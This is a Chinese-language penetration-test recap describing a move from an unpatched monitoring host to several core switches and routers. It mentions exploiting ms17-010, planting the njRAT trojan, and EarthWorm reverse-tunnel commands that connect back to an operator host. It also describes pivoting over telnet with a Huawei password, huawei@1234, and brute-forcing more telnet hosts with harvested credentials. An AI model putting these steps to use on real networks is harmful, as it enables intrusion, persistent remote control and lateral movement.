# 复盘从一个监控主机到核心路由沦陷

在对内网进行 `ms17-010` 扫描时，发现 2 台之前没有出现过且没有打补丁的主机，于是，尝试了一波

kali 主机在扫描时发现 2 台之前没有出现过且没有打补丁的主机

![](../Images/551de444e9fe92fc8fb712d937ae9a3a.png)

尝试打了一波  

![](../Images/6d37c8d85df6eb73a23e1b18a797bfab.png)

然后种了个 `njrat`  

![](../Images/4fa50950522cd11cf935eb35eee1ec2c.png)

翻文件的时候发现了点配置文件

![](../Images/391e146928ed8024f0c3ba846165f519.png)

  

`down` 下来解压后发现是交换机的配置文件，于是有了一个大胆的想法

![](../Images/1c50d1defb0a1de58c8a070978740572.png)

查看了被控主机的网络连接后，发现一个地址无法 `ping` 通，`TCP` 包也无法到达，推测做了 `ACL`  

![](../Images/c753885d644ae0d07b995b4f720b2edf.png)

于是在被控机上搭了 `earthworm` 做转发  

> 本机执行 `ew -s rcsocks -l 本地代理端口 -e 远端连接端口`
> 
> 被控机执行 `ew -s rssocks -d 主控机IP -e 远端连接端口`

![](../Images/5a8cc2f9b0e1894b7b692e653e1373b5.png)

然后开启 `proxifier` 的代理功能，成功访问了那个系统，但这不是主要目的  

![](../Images/ca38a8169b04916cf57b4edc3c67c7ce.png)

在咨询了好哥们后，他建议尝试搞搞交换机看看  

在对 `10.2.66/24` 网段扫描后发现 `10.2.66.254` 开放了 `80` 和 `23` 端口，尝试 `xshell` 连接

![](../Images/e338e43bd7100f9daabcf25172453838.png)

成功使用 `huawei` 密码 `huawei@1234` 连接，继续翻上级路由  

![](../Images/1a0ee1ba4d1fb3242572c3672a69a444.png)

![](../Images/424a0f88b05442cc3b56bb7338f3b93a.png)

发现了 `10.2.20.1`  

继续 `telnet`

![](../Images/43ec6d952bc5d32bea884e9930dfee90.png)

继续翻  

![](../Images/23ea7aa4779472869b1f34314dea4efc.png)

发现 10.2.20.58  

![](../Images/9f7602a7b08ed3520b59d0babff8b2d8.png)

继续翻，翻到 10.4.0.1  

![](../Images/a8c3550b0f9d3daf7e3bce4cd865c6b2.png)

继续 telnet  

![](../Images/6546d6db2b1416ba17cfeed9688e7b44.png)

另外发现此时可以 ping 通 10.4.0.1 这台交换机  

![](../Images/0de4c6f0af952ff34d91068d491cea6c.png)

于是乎，扔浏览器打开看看  

![](../Images/90906d666c05d9cb6a3300f1a16cb2a1.png)

  

![](../Images/0eeb6ab2d8025ad49cc7b1b17e40e526.png)

拿下后将本次收集到的密码与巡风扫描到的 telnet 主机进行爆破后发现了更多的交换机。。。。。。
